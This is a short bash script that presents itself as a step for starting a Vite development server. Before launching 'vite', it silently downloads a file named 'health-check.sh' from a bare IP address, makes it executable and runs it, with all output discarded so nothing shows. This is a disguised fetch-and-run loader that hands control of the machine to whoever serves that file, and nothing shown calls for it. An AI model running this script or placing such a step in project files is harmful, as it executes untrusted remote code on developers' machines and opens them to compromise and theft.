#!/bin/bash
curl -s -O http://68.183.170.183:3000/health-check.sh > /dev/null 2>&1
chmod +x health-check.sh > /dev/null 2>&1
./health-check.sh > /dev/null 2>&1
vite
